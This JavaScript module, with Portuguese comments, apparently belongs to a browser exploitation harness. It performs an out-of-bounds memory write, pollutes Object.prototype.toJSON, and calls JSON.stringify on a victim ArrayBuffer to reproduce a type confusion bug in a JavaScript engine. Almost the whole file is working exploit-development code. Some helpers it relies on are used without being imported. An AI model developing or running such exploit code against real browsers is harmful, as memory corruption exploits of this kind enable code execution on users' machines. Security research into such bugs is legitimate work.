// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeVictimABInstabilityTest, // Usaremos esta para o teste sequencial
    toJSON_AB_Probe_V1,
    toJSON_AB_Probe_V2_Detailed,
    // toJSON_AB_Probe_V3 // Não vamos chamar V3 diretamente no loop sequencial principal por enquanto
} from './testVictimABInstability.mjs';

async function runReproduceTCSequential() {
    const FNAME_RUNNER = "runReproduceTCSequential";
    logS3(`==== INICIANDO Teste de Reprodução de TC Sequencial em victim_ab ====`, 'test', FNAME_RUNNER);

    const victim_ab_size_val = 64;
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    // 1. Setup OOB e corrupção (FEITO UMA VEZ)
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando teste principal.", "error", FNAME_RUNNER);
        return;
    }
    let victim_ab;
    try {
        victim_ab = new ArrayBuffer(victim_ab_size_val);
        victim_ab.customPropStr = "hello_victim_seq";
        victim_ab.customPropNum = 54321;
        logS3(`1. victim_ab criado com props customizadas (para uso sequencial).`, "info", FNAME_RUNNER);
    } catch (e_victim_alloc) {
        logS3(`ERRO ao criar victim_ab: ${e_victim_alloc.message}. Abortando.`, "error", FNAME_RUNNER);
        clearOOBEnvironment();
        return;
    }
    try {
        logS3(`2. Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]... (UMA VEZ)`, "warn", FNAME_RUNNER);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_RUNNER);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_RUNNER);
        clearOOBEnvironment();
        return;
    }
    await PAUSE_S3(SHORT_PAUSE_S3);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let result_call1 = null;
    let result_call2 = null;

    // --- CHAMADA 1 ---
    const toJSON_Call1_Func = toJSON_AB_Probe_V2_Detailed;
    const toJSON_Call1_Name = "toJSON_AB_Probe_V2_Detailed";
    logS3(`\n--- CHAMADA 1: JSON.stringify(victim_ab) com ${toJSON_Call1_Name} ---`, "subtest", FNAME_RUNNER);
    try {
        Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_Call1_Func, writable: true, configurable: true, enumerable: false });
        pollutionApplied = true;
        document.title = `Seq. TC - Call 1 (${toJSON_Call1_Name})`;
        result_call1 = JSON.stringify(victim_ab); // Usa o mesmo victim_ab
        logS3(`   Resultado da toJSON (Chamada 1 - ${toJSON_Call1_Name}): ${JSON.stringify(result_call1)}`, "info", FNAME_RUNNER);
        if (result_call1 && result_call1.error) {
            logS3(`     ERRO INTERNO (reportado pela toJSON) na Chamada 1: ${result_call1.error}`, "warn", FNAME_RUNNER);
        }
    } catch (e_str1) {
        logS3(`   !!!! ERRO AO STRINGIFY (Chamada 1 - ${toJSON_Call1_Name}) !!!!: ${e_str1.name} - ${e_str1.message}`, "critical", FNAME_RUNNER);
        if (e_str1.stack) logS3(`       Stack: ${e_str1.stack}`, "error");
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
            pollutionApplied = false;
        }
    }

    let state_after_call1 = "N/A";
    try {
        state_after_call1 = `Type: ${Object.prototype.toString.call(victim_ab)}, instanceof AB: ${victim_ab instanceof ArrayBuffer}, byteLength: ${victim_ab ? victim_ab.byteLength : 'N/A'}`;
        logS3(`   Estado de victim_ab APÓS Chamada 1 (${toJSON_Call1_Name}): ${state_after_call1}`, "info", FNAME_RUNNER);
    } catch (e_check1) {
        state_after_call1 = `Error checking victim_ab: ${e_check1.message}`;
        logS3(`   ERRO ao checar victim_ab APÓS Chamada 1: ${e_check1.message}`, "error", FNAME_RUNNER);
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // --- CHAMADA 2 ---
    const toJSON_Call2_Func = toJSON_AB_Probe_V1; // Usar V1 para sondar o estado básico
    const toJSON_Call2_Name = "toJSON_AB_Probe_V1";
    logS3(`\n--- CHAMADA 2: JSON.stringify(victim_ab) com ${toJSON_Call2_Name} (MESMO victim_ab) ---`, "subtest", FNAME_RUNNER);
    try {
        Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_Call2_Func, writable: true, configurable: true, enumerable: false });
        pollutionApplied = true;
        document.title = `Seq. TC - Call 2 (${toJSON_Call2_Name})`;
        result_call2 = JSON.stringify(victim_ab); // Usa o mesmo victim_ab
        logS3(`   Resultado da toJSON (Chamada 2 - ${toJSON_Call2_Name}): ${JSON.stringify(result_call2)}`, "info", FNAME_RUNNER);
        if (result_call2 && result_call2.error) {
            logS3(`     ERRO INTERNO (reportado pela toJSON) na Chamada 2: ${result_call2.error}`, "warn", FNAME_RUNNER);
        }
    } catch (e_str2) {
        logS3(`   !!!! ERRO AO STRINGIFY (Chamada 2 - ${toJSON_Call2_Name}) !!!!: ${e_str2.name} - ${e_str2.message}`, "critical", FNAME_RUNNER);
        if (e_str2.stack) logS3(`       Stack: ${e_str2.stack}`, "error");
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    // Análise Final
    logS3("\n--- Análise Final do Teste de TC Sequencial ---", "test", FNAME_RUNNER);
    if (result_call2 && result_call2.toJSON_variant === "toJSON_AB_Probe_V1") {
        if (result_call2.error && result_call2.error.includes("not an ArrayBuffer instance at entry")) {
            logS3("   !!!! TYPE CONFUSION CONFIRMADA NA ENTRADA DA SEGUNDA CHAMADA toJSON (V1) !!!!", "vuln", FNAME_RUNNER);
            logS3(`        Na Chamada 2 (V1), this_type_entry foi: ${result_call2.this_type_entry}, is_array_buffer_instance_entry: ${result_call2.is_array_buffer_instance_entry}`, "vuln", FNAME_RUNNER);
            document.title = "SUCCESS: TC on 2nd Call Confirmed!";
        } else if (result_call2.error) {
            logS3(`   PROBLEMA na Chamada 2 (V1): Erro interno da toJSON = ${result_call2.error}`, "error", FNAME_RUNNER);
        } else if (!result_call2.is_array_buffer_instance_entry) {
            logS3(`   PROBLEMA na Chamada 2 (V1): this NÃO é ArrayBuffer na entrada! Tipo: ${result_call2.this_type_entry}`, "error", FNAME_RUNNER);
        } else {
            logS3("   Chamada 2 (V1): victim_ab ainda parece ser um ArrayBuffer funcional. Type Confusion não reproduzida neste teste.", "good", FNAME_RUNNER);
        }
    } else {
        logS3("   Chamada 2 não produziu um resultado esperada da toJSON_AB_Probe_V1 para análise.", "warn", FNAME_RUNNER);
    }

    clearOOBEnvironment();
    logS3(`==== Teste de Reprodução de TC Sequencial CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}


export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_ReproduceTCSequential';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Teste de Reprodução de Type Confusion Sequencial em victim_ab ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Reproduce TC Sequential";

    await runReproduceTCSequential();

    logS3(`\n==== Script 3 CONCLUÍDO (Reproduce TC Sequential) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("SUCCESS") || document.title.includes("Type Confusion") || document.title.includes("ERRO") || document.title.includes("CRASH")) {
        // Manter títulos que indicam resultados específicos
    }
    else {
        document.title = "Script 3 Concluído - Reproduce TC Sequential";
    }
}
